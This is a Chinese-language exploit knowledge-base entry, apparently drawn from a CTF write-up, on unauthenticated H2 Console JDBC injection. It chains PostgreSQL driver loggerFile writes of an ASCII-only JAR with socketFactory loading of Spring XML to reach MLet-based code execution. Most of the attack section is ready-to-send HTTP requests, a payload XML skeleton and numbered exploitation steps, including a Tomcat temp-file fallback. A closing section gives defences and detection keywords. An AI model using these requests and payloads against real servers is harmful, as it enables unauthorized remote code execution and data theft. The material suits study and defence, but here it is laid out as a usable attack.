---
id: web-java-component-h2-console-postgres-loggerfile-ascii-jar-spring-xml-rce
title: H2 Console 未授权 JDBC 注入：PostgreSQL loggerFile 写 ASCII JAR + socketFactory 加载 Spring XML RCE
type: scenario
domain: web
path: web/java/component
technique: h2-console-postgres-loggerfile-ascii-jar-spring-xml
tags:
- java
- h2
- h2-console
- jdbc
- postgresql
- spring
- socketfactory
- ascii-jar
- tomcat
- rce
cve: []
severity: critical
confidence: medium
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V194
  verified_at: '2026-11-06T22:45:11+08:00'
  notes: 已对照原文与截图核对：/h2-console 未授权、H2 2.1.214、Generic PostgreSQL、loggerFile=C://Windows/Temp/ascii02.jar、socketFactory=ClassPathXmlApplicationContext+MLet.defineClass、Tomcat multipart 临时文件 *.tmp 兜底、X-Authorization 回显读 flag 均一致；未复跑 PoC，payload 字节与临时文件路径需按目标调整。
url: /docs/web/java/component/web-java-component-h2-console-postgres-loggerfile-ascii-jar-spring-xml-rce/
draft: false
kb_aliases:
- H2 Console 未授权
- H2 JDBC 不出网利用
- PostgreSQL loggerFile 任意文件写
- ascii jar 写文件
- socketFactory ClassPathXmlApplicationContext
- Tomcat 临时文件通配符
- h2-console login.do
---

## 一句话结论

Spring Boot 应用暴露未授权的 `/h2-console` 时，登录表单允许用户指定任意 JDBC 驱动与 URL；攻击者先用 PostgreSQL JDBC 驱动的 `loggerLevel=DEBUG&loggerFile=` 把 URL 中夹带的 ASCII-only JAR 写到目标磁盘，再用 `socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext` 从该 JAR（或 Tomcat 临时文件）加载恶意 Spring XML，经 `MLet.defineClass` 执行任意代码，全程不需要目标出网。

## 原理

- **H2 Console 是 JDBC 入口**：H2 的 Web Console 登录页（`/h2-console/login.do`）允许用户填写 `Driver Class`、`JDBC URL`、用户名和密码，服务端会按用户提供的驱动/URL 建立连接。若控制台未授权暴露，攻击者就能让服务端加载 classpath 中任意 JDBC 驱动并连接任意地址，形成“JDBC 注入”。
- **loggerFile 任意文件写**：PostgreSQL JDBC 驱动支持 `loggerLevel=DEBUG` 与 `loggerFile=<path>`，连接时会打开指定文件并写入调试日志。攻击者把 JAR 字节直接拼在 JDBC URL 的查询串后面；驱动把包含该 URL 的日志写入 `loggerFile`，JAR 字节随之落盘。
- **ASCII-only JAR**：普通 JAR 含大量非 URL 安全字节，放进 URL 会被编码/截断；攻击者用压缩器构造一个所有字节都在允许 ASCII 集合内、且 ZIP 结构能容忍日志前缀/后缀的 JAR（`META-INF/resources/poc.xml` 为 Spring XML）。这样即使日志在 JAR 前后写入脏数据，落盘文件仍能被 `jar:`/`file:` 加载。
- **socketFactory 加载 Spring XML**：pgjdbc 支持 `socketFactory` 属性指定 `javax.net.SocketFactory` 实现类；把它设为 `org.springframework.context.support.ClassPathXmlApplicationContext`、`socketFactoryArg` 设为 `jar:file:///C:/Windows/Temp/ascii02.jar!/META-INF/resources/poc.xml`，驱动在建立连接前实例化 Spring 容器，容器解析 XML 并创建 bean。
- **MLet defineClass 执行**：XML 中的 `MethodInvokingFactoryBean` 用 `javax.xml.bind.DatatypeConverter.parseBase64Binary` 解码 Base64 类字节码，`javax.management.loading.MLet.defineClass` 定义类，`newInstance` 触发构造/静态代码，执行命令或注册回显组件。
- **临时文件兜底**：如果 loggerFile 写出的 JAR 被日志前缀破坏（ZipException/FileNotFoundException），可先发一个 multipart 请求并保持连接，让 Tomcat 把恶意 Spring XML 写入 `work/Tomcat/localhost/ROOT` 下的临时文件；再用 `socketFactoryArg=file://${catalina.home}/work/Tomcat/localhost/ROOT/*.tmp` 通配符加载。Tomcat 在请求未结束时不会删除临时文件。
- **为什么不出网**：Spring XML、JAR、字节码都在目标本地；不需要 ClassPathXmlApplicationContext 远程下载，也不依赖 JNDI/LDAP 出网。

## 触发条件

- Spring Boot 应用启用并暴露 H2 Web Console（`/h2-console`），且未加认证/网络限制；文章环境 H2 2.1.214。
- H2 Console 允许用户自定义 JDBC 驱动与 URL（默认行为），classpath 中存在 PostgreSQL JDBC 驱动与 Spring Context。
- 目标为 Windows/Linux 均可，文章使用 Windows 路径 `C:/Windows/Temp/`；需要可写临时目录与可读的 `catalina.home` 工作目录。
- 攻击者可发送 POST 请求并保持 multipart 连接；目标未禁用 `socketFactory`/Spring XML 解析，或未对 JDBC URL 做严格白名单。
- 若走 loggerFile 路径，需要 PostgreSQL 驱动版本支持 `loggerFile`；若走临时文件路径，需要 Tomcat 的 multipart 临时文件可被 Spring 通配符匹配。

## 利用步骤

1. 访问 `/h2-console`，确认无需登录即可打开登录页；提交一个合法 H2 URL 观察连接行为，确认 `url` 参数可控。
2. 选择 `Generic PostgreSQL` 驱动，构造 `url=jdbc:postgresql:///?loggerLevel=DEBUG&loggerFile=C:/Windows/Temp/ascii02.jar&`，并把 ASCII-only JAR 的字节拼在 URL 后面 POST 到 `/h2-console/login.do`；驱动将 URL/JAR 写入 `ascii02.jar`。
3. 第二个请求把 `url` 设为 `jdbc:postgresql:///?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&socketFactoryArg=jar:file:///C:/Windows/Temp/ascii02.jar!/META-INF/resources/poc.xml`；Spring 加载 JAR 内 XML，`MLet` 定义并实例化恶意类，执行命令。
4. 若 JAR 被日志前缀破坏，改为：先发 multipart 请求上传恶意 Spring XML 并保持连接，让 Tomcat 把内容写入 `work/Tomcat/localhost/ROOT/*.tmp`；再用 `socketFactoryArg=file://${catalina.home}/work/Tomcat/localhost/ROOT/*.tmp` 让 Spring 通配符加载该临时文件。
5. 用响应头/回显（文章用 `X-Authorization: type f1111laag.txt` 读取命令输出）确认执行；随后读取 flag 或继续横向。
6. 若 `jar:` 路径被限制，尝试 `file:`/`http:` 变体；若驱动版本不支持 `loggerFile`，换用其他可写文件的 JDBC 驱动/参数。

## PoC

第一步（写入 ASCII JAR，`<jar bytes>` 为 ASCII-only JAR 原始字节，实际需 URL 安全处理）：

```http
POST /h2-console/login.do?jsessionid=<sid> HTTP/1.1
Host: target:8080
Content-Type: application/x-www-form-urlencoded

language=en&name=Generic+PostgreSQL&setting=Generic+PostgreSQL&user=sa&password=sa&url=jdbc:postgresql:///?loggerLevel=DEBUG&loggerFile=C://Windows/Temp/ascii02.jar&<jar bytes>
```

第二步（加载 Spring XML）：

```http
POST /h2-console/login.do?jsessionid=<sid> HTTP/1.1
Host: target:8080
Content-Type: application/x-www-form-urlencoded

language=en&setting=Generic+PostgreSQL&url=jdbc:postgresql:///?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&socketFactoryArg=jar:file:///C:/Windows/Temp/ascii02.jar!/META-INF/resources/poc.xml
```

临时文件兜底：

```http
POST /h2-console/login.do?jsessionid=<sid> HTTP/1.1
Host: target:8080
Content-Type: application/x-www-form-urlencoded

language=en&setting=Generic+PostgreSQL&url=jdbc:postgresql:///?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&socketFactoryArg=file://${catalina.home}/work/Tomcat/localhost/ROOT/*.tmp
```

Spring XML 核心结构（示意，Base64 类字节码省略）：

```xml
<beans xmlns="http://www.springframework.org/schema/beans" ...>
  <bean id="decoder" class="org.springframework.beans.factory.config.MethodInvokingFactoryBean">
    <property name="staticMethod" value="javax.xml.bind.DatatypeConverter.parseBase64Binary"/>
    <property name="arguments"><list><value>&lt;base64 class bytes&gt;</value></list></property>
  </bean>
  <bean id="classLoader" class="javax.management.loading.MLet"/>
  <bean id="clazz" factory-bean="classLoader" factory-method="defineClass">
    <constructor-arg ref="decoder"/><constructor-arg type="int" value="0"/><constructor-arg type="int" value="5128"/>
  </bean>
  <bean factory-bean="clazz" factory-method="newInstance"/>
</beans>
```

原文通过该链读取到 flag；PoC 未在本机复跑，JAR 字节、类长度和临时文件路径需按目标调整。

## 变体与关联

- 变体：用 Kingbase8 的 `ConfigurePath` 直接加载 `/proc/self/fd/<N>` 属性文件，再用 `socketFactoryArg=file:/.../**/*.tmp` 加载 Spring XML，见 [[web-java-component-kingbase8-jdbc-configurepath-tempfile-spring-xml-rce]]。
- 变体：重复 `url` 参数做属性走私，把 `&socketFactory=` 拼进 pgjdbc URL，见 [[web-java-component-jdbc-duplicate-param-socketfactory-property-smuggling]]。
- 关联：H2 `INIT=RUNSCRIPT` 本地 RCE 见 [[web-java-deserialization-jndi-ldap-local-factory-h2-init-rce]]；JDBC 驱动 SPI 凭据窃取见 [[web-java-classloader-jdbc-driver-spi-credential-theft]]。
- 边界：H2 Console 关闭/加认证、JDBC URL 白名单禁止任意驱动、pgjdbc 修复/禁用 `loggerFile` 与 `socketFactory`、Spring Context 不在 classpath、临时目录不可写或 `catalina.home` 未知时，需要换用其他链。

## 检测与防御

- **关闭控制台**：生产环境设置 `spring.h2.console.enabled=false`，或将 `/h2-console` 限制到 localhost/管理网并加认证。
- **限制 JDBC 入口**：数据源测试/控制台只允许白名单驱动与白名单 URL，禁止用户自定义 `driver`、`socketFactory`、`socketFactoryArg`、`loggerFile`、`ConfigurePath` 等属性；对 URL 做规范化与关键字黑名单（同时处理大小写、编码、重复参数）。
- **依赖裁剪**：生产 classpath 移除 H2 Console、PostgreSQL JDBC 驱动、Spring Context 等非必要组件；升级 pgjdbc 到修复版本。
- **检测**：`/h2-console/login.do` 出现 `socketFactory`、`loggerFile`、`ClassPathXmlApplicationContext`、`MLet`、`defineClass` 等关键字；`C:/Windows/Temp` 或 Tomcat `work` 目录出现异常 JAR/`.tmp`；`java` 进程打开/写入临时文件后加载 Spring XML；响应头出现异常 `X-Authorization`。
- **加固**：临时目录最小权限；禁止 `MLet`/`ClassPathXmlApplicationContext` 加载不可信资源；WAF 拦截 `jdbc:`、`socketFactory`、`loggerFile` 等参数；对数据源接口做认证与审计。
